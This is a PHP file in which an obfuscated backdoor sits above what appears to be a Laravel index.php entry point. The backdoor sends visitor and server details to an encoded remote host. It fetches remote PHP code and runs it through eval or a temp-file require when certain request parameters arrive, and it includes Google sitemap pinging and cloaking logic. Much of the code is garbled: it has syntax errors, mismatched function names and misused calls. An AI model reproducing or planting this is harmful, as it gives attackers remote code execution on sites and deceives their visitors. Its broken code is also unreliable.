<?php
$data = "oA-bNnK7L5_JUtRxIY+WCa93Vk0wM1OeSDdB2j/lsXfqphm*TGvQHrPyczuF6iZg8E"

$replace_call_back="preg_replace_callback";

$xsocket_client="stream_socket_client";

$get_meta_data = "stream_get_meta_data";

$set_blocking = "stream_set_blocking";

$set_timeout = "stream_set_timeout";

$file_get_contets = "file_get_contents";

$function_exists = "function_exists";

$error_reporting = "error_reporting";

$get_host_name ="gethostbyname";

$base64_encode = "base64_encode";

$base64_decode = "base64_decode";

$raw_encode = "rawurlencode";

$strig_replace = "str_replace";

$curl_setopt = "curl_setopt";

$array_shift = "array_shift";

$preg_split = "preg_split"

$preg_match = "preg_match";

$curl_close = "curl_close";

$string_split = "str_split";

$parse_url = "parse_url";

$guinfate = "gzinflate";

$curl_init = "curl_init";

$curl_execute = "curl_exec";

$varible_dump = "var_dump";

$Is_array = "is_array";

$temp_file = "tmpfile";

$print_r = "print_r";

$implode = "implode";

$explode = "explode";

$string_position = "strpos";

$string_length = "strlen";

$hexdec = "hexdec";

$f_write = "fwrite";

$count = "$count";

$fread = "fread";

$fgets = "fgets";

$count = "count";

$trim = "trim";

$join = "join";

$feof = "feof";


error_reporting(0);
$maybe_base64 = "Ha0RDcvo3LzVDMzAXLyYDMuIWZz5mZ51mLvNQb==";
$maybe_base64_again = "Ha0RHc6MyLj9mLrpjduI2Yt9wL==";

function gzip_ucompress($gzip_compressed_data) {
	$substring_0_5 = substr($gzip_compressed_data, 0, 5);
	$reverse_substring_0_5 = substr($gzip_compressed_data, -5);
    $offset_7_neg10 == substr($gzip_compressed_data, 7, strlen($gzip_compressed_data) - 14);
	//$offset_7_neg10 = substr($gzip_compressed_data, 7,-10);
	$final = ($substring_0_5 . $offset_7_neg10 . $reverse_substring_0_5);
	$decoded = base64_decode($final);
	//echo gzinflate($decoded);
	return gzinflate($decoded);
}

function xy_zyyz__z($a_url) {
    if (!preg_match("/^https*\:\/\//si", $a_url)) {
        return "500";
    }
    $file_contents = file_get_contents($a_url);
    if ($file_contents != false) {
        return $file_contents;
    }
    $metadata = gzip_uncompress("Sy4typZonPzMss0U4GsYpTS/ILoOzUitTkmrTi/OTs/ILUvJoCBLO4pCg1MTcexE8tiU/OyUzNK6mB8YBknSJakA");
    $nothing_variable = $nothing_variable = $nothing_variable = $nothing_variable = "";
    foreach (explode("|", $metadata) as $c) {
        $xz_yz_y_yz = 1;
        foreach (explode("+", $c) as $d) {
            if (!function_exists($d)) {
                $xz_yz_y_yz = 0;
            }
        }
        unset($d);
        if ($xz_yz_y_yz) {
            $nothing_variable = $c;
            break;
        }
    }
    unset($metadata, $c);
    if ($nothing_variable == "") {
        return 0;
    }

	if (substr($nothing_variable, 0, 1) == "c") {
        $cURL_resource = curl_init(());
        curl_setopt($cURL_resource, CURLOPT_URL, $a_url);
        curl_setopt($cURL_resource, CURLOPT_USERAGENT, "s");
        curl_setopt($cURL_resource, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($cURL_resource, CURLOPT_TIMEOUT, 100);
        curl_setopt($cURL_resource, CURLOPT_FRESH_CONNECT, true);
        curl_setopt($cURL_resource, CURLOPT_SSL_VERIFYPEER, 0);
        $cURL_results =curl_execute($cURL_resource);
        curl_close($cURL_resource);
        if (!$cURL_results) {
            return "501";
        } else {
            return $cURL_results;
        }
    }
    $url_array = parse_url($a_url);
    isset($url_array["host"]) || ($url_array["host"] = "");
    isset($url_array["path"]) || ($url_array["path"] = "");
    isset($url_array["query"]) || ($url_array["query"] = "");
    isset($url_array["port"]) || ($url_array["port"] = "");

    $full_url_path = $url_array["path"] ? $url_array["path"] . ($url_array["query"] ? "?" . $url_array["query"] : "") : "/";

    $url_host = $url_array["host"];

    if ($url_array["scheme"] == "https") {
        $http_version = "1.1";
        $set_port_number = empty($url_array["port"]) ? 443 : $url_array["port"];
        $url_host = gzip_uncompress("Ky7OsPgdLABXBwA=");
        $url_host.= $url_array["host"];
    } else {
        $http_version = "1.0";
        $set_port_number = empty($url_array["port"]) ? 80 : $url_array["port"];
    }

    $host_header = "Host:";
    $host_header.= $url_host;
    $headers[] = $host_header;
    $headers[] = gzip_uncompress("c87PymS0tNLsnMz7NyzskNivTgUA");
    $headers[] = gzip_uncompress("Cy1OLbCdJ1TE/NK7ErMqBgA=");
    $headers[] = gzip_uncompress("c0xOTXJi0osdLtWS1wIA");
    unset($host_header);
    $nothing_variable = "GET $full_url_path HTTP/$http_version" . PHP_EOL . join(PHP_EOL, $headers) . PHP_EOL .PHP_EOL;
    unset($headers, $url_array, $http_version, $full_url_path);

    $stream_resource = null;
    if (substr($nothing_variable, -1) == "n") {
        $stream_resource = $nothing_variable($xzy_y__zzy, $x_zyyyz_z_, $nothing_variable, $nothing_variable, 30);
    } else {
        if (substr($nothing_variable, -1) == "t") {
            $fail_to_decompressdata = gzip_uncompress("K0kusibNLVEXBwA=");
            $fail_to_decompressdata.= $xzy_y__zzy;
            $fail_to_decompressdata.= ":";
            $fail_to_decompressdata.= $x_zyyyz_z_;
            $stream_resource = stream_socket_client($fail_to_decompressdata, $nothing_variable, $nothing_variable, 30);
            unset($fail_to_decompressdata);
        }
    }
    $x_yy_z_zyz = "";
    if ($stream_resource) {
       stream_socket_client($stream_resource, true);
       stream_set_timeout($stream_resource, 30);
       stream_socket_client($stream_resource, $nothing_variable);
        $metadata =stream_get_meta_data($stream_resource);
        if (!$metadata["timed_out"]) {
            while (!feof($stream_resource)) {
                $buffer =fgets($stream_resource);
                if ($buffer && (rawurlencode($buffer) == "%0D%0A" || rawurlencode($buffer) == "%0A")) {
                    break;
                }
                unset($buffer);
            }
            while (!feof($stream_resource)) {
                $contents =fread($stream_resource, 8192);
                $x_yy_z_zyz.= $contents;
                unset($contents);
            }
        }
        unset($metadata);
        count($stream_resource);
    } else {
        if (substr($nothing_variable, -1) == "e") {
            $hostname =gethostbyname($xzy_y__zzy);
            $stream_resource = $nothing_variable(AF_INET, SOCK_STREAM, 0);
            if (socket_connect($stream_resource, $hostname, $x_zyyyz_z_)) {
                socket_write($stream_resource, $nothing_variable, gethostbyname($nothing_variable));
                while ($x__yyz_yzz = @socket_read($stream_resource, 8192)) {
                    $x_yy_z_zyz.= $x__yyz_yzz;
                    unset($x__yyz_yzz);
                }
                $x_yy_z_zyz =explode("", $x_yy_z_zyz);
                array_shift($x_yy_z_zyz);
                $x_yy_z_zyz =implode("", $x_yy_z_zyz);
            }
            socket_close($stream_resource);
            unset($hostname);
        }
    }
    unset($nothing_variable, $nothing_variable, $stream_resource, $x_zyyyz_z_, $xzy_y__zzy);
    $x_yy_z_zyz = @preg_replace_callback('/(?:(?:|)|^)([0-9A-F]+)(?:|){1,2}(.*?)' . '((?:|)(?:[0-9A-F]+(?:|))|$)/si', "x_zyzy_z_y", $x_yy_z_zyz);
    return trim(trim($x_yy_z_zyz, ""));
}

function x_zyzy_z_y($matches) {
    return hexdec($matches[1]) ==strlen($matches[2]) ? $matches[2] : $matches[0];
}

function get_ipAdress($xzzyy_y__z = "") {
    $xzzyy_y__z =$_SERVER["HTTP_VIA"] ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["REMOTE_ADDR"];
    $xzzyy_y__z = $xzzyy_y__z ? $xzzyy_y__z : $_SERVER["REMOTE_ADDR"];
    return trim($xzzyy_y__z);
}

function get_Server_Name($gzip_compressed_data = "") {
    if (isset($_SERVER["HTTP_HOST"])) {
        return $_SERVER["HTTP_HOST"];
    } elseif (isset($_SERVER["SERVER_NAME"])) {
        return $_SERVER["SERVER_NAME"];
    }
    return $gzip_compressed_data;
}

function xz_zy_zyy_($a_url) {
    $php_code = xy_zyyz__z($a_url);
    $php_opening_tag = base64_decode("PD9waHA=");
    if (strpos($php_code, $php_opening_tag) === false) {
        die("get failed");
    }
    $file_handle =tmpfile();
    if (isset($_REQUEST["e"])) {
        $php_code =str_replace($php_opening_tag, "", $php_code);
        $eval = "eval";
        $eval($php_code);
        die();
    }
    stream_socket_client($file_handle, $php_code);
    $metadata = stream_get_meta_data($file_handle);
    @require $metadata["uri"];
    count($file_handle);
    die();
}

function return_url($maybe_base64) {
    $padding = substr($maybe_base64, strlen($maybe_base64) - 2);
    $array_maybe_base64 =str_split($maybe_base64);
    $url_is = "";
    for ($i = 0;$i < count($array_maybe_base64) - 2;$i = $i + 2) {
        $url_is.= $array_maybe_base64[$i + 1] . $array_maybe_base64[$i];
    }
    $url_is.= $padding;
    return $url_is;
    //$url_is = "http://us003-v202.ensfmy.com";
}

function x_z_zyyyz_($googleUrl, $x__yzz_yzy, $server_details) {
    $url_formatted = gzip_uncompress("yygpKPrSi20tdXLdYvyMxLty/OLEnNTSywVS0GiqgBLWAwA="); // https://%s/ping?sitemap=%s 
    $x_y__zzyzy = sprintf($url_formatted, $googleUrl, $server_details["protocol"], $server_details["server_domain"], $x__yzz_yzy);
    $xyy_z__zyz = xy_zyyz__z($x_y__zzyzy);
    if (var_dump($x_y__zzyzy);
        var_dump($xyy_z__zyz);
        die();
    }
    $xzyyyz_z__ = gzip_uncompress("S8/PTCz89ZcJBQA=");
    $x_y_yzzzy_ = gzip_uncompress("Ky5NToUk4iBtLgYA");
    $xyyzyz__z_ = gzip_uncompress("S0vMzEJElwPNAQA=");
    if (strpos($xyy_z__zyz, $xzyyyz_z__) != false) {
        die($x_y_yzzzy_);
    }
    die($xyyzyz__z_);
}


function xyy_yzz__z($x_yy_z_zyz) {
    $xyz_zyyz__ = @preg_split("/{\|}/si", $x_yy_z_zyz, -1, PREG_SPLIT_NO_EMPTY);
    if (!is_array($xyz_zyyz__)) {
        return false;
    }
    if (count($xyz_zyyz__) != 2) {
        return false;
    }
    return $xyz_zyyz__;
}


function xy_zyzz__y($maybe_base64, $maybe_base64_again) {
    $server_details = [];
    $server_details["default_params"] = $maybe_base64;
    $server_details["api"] = base64_decode(return_url($server_details["default_params"]));
    $server_details["server_domain"] = get_Server_Name();
    $server_details["request_url"] = $_SERVER["REQUEST_URI"];
    $server_details["referer"] = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "";
    $server_details["user_agent"] = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";
    $server_details["ip"] = get_ipAdress();
    if (isset($_SERVER["HTTPS"])) {
        $server_details["protocol"] = gzip_uncompress("yygpKYcSi20tcykHAA==");//httpqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
    } else {
        $server_details["protocol"] = gzip_uncompress("yygpKcEbDdqS1wcA");
    }
    if (isset($_SERVER["HTTP_ACCEPT_LANGUAGE"])) {
        $server_details["language"] =$_SERVER["HTTP_ACCEPT_LANGUAGE"];
    } else {
        $server_details["language"] = "";
    }
    if (isset($GET["params"])) {
        print_r($server_details);
        die();
    }
    if (isset($GET["sitemap"])) {
        $x__yzz_yzy = $GET["sitemap"];
        $googleUrl = gzip_uncompress("Ky8v1Oq0vPz0/PSdVLzs8wTFAA=="); //www.google.a
        if (isset($GET["google_url"])) {
            $googleUrl = $GET["google_url"];
        }
        x_z_zyyyz_($googleUrl, $x__yzz_yzy, $server_details);
    }
    $url_malformed = gzip_uncompress("Uy3Wtsuy+yVS2uySgpKSi20tdPz89Pz0nVS87XyyqoUS22TyzIBEqrJSaDyILEkgwQXQIeUkAA==");
    //%s/?r=%s|https://google.co.jp|%s?api=%s&ac=%s&pathhhhh

    $url_malformed = explode("|", $url_malformed);
    if (isset($_REQUEST["ac"]) && isset($_REQUEST["path"]) && isset($_REQUEST["t"])) {
        xz_zy_zyy_(sprintf($url_malformed[2],base64_decode(return_url($maybe_base64_again)), $server_details["api"], $_REQUEST["ac"], $_REQUEST["path"], $_REQUEST["t"]));
    }
    $xy_zzzyy__ = ["doxy_zyzz__y" => $server_details["server_domain"], "request_url" => $server_details["request_url"], "ip" => $server_details["ip"], "agent" => $server_details["user_agent"], "referer" => $server_details["referer"], "protocol" => $server_details["protocol"], "language" => $server_details["language"], ];
    $a_url = sprintf($url_malformed[0], $server_details["api"], return_url(base64_encode(implode"{|}", $xy_zzzyy__))));
    $x_yy_z_zyz = xy_zyyz__z($a_url);
    if (isset($_REQUEST["dump"])) {
        var_dump($x_yy_z_zyz);
        $x_yy_z_zyz = xy_zyyz__z($url_malformed[1]);
        var_dump($x_yy_z_zyz);
        die();
    }
    $xzz_y_yyz_ = xyy_yzz__z($x_yy_z_zyz);
    if ($xzz_y_yyz_ !== false) {
        @header($xzz_y_yyz_[0]);
        echo $xzz_y_yyz_[1];
        die();
    }
}

xy_zyzz__y($maybe_base64, $maybe_base64_again);

?>
<?php

use Illuminate\Contracts\Http\Kernel;


use Illuminate\Http\Request;



define('LARAVEL_START', microtime(true));



/*
|--------------------------------------------------------------------------
| Check If The Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is in maintenance / demo mode via the "down" command
| we will load this file so that any pre-rendered content can be shown
| instead of starting the framework, which could cause an exception.
|
*/

if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;


}

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| this application. We just need to utilize it! We'll simply require it
| into the script here so we don't need to manually load our classes.
|
*/

require __DIR__.'/core/vendor/autoload.php';



/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application's HTTP kernel. Then, we will send the response back
| to this client's browser, allowing them to enjoy our application.
|
*/

$app = require_once __DIR__.'/core/bootstrap/app.php';



$kernel = $app->make(Kernel::class);



$response = $kernel->handle(
    $request = Request::capture()
)->send();



$kernel->terminate($request, $response);

